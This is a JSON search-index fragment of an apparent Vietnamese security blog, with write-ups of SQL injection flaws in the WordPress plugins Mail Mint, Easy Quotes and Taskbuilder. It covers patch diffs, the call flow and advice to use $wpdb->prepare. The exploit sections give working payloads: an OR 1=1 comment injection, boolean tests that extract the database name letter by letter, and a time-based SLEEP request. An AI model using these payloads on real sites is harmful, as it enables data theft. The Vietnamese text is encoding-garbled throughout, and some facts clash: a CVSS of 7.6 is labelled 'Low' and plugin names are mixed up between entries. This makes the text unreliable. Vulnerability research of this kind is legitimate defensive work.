\u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name 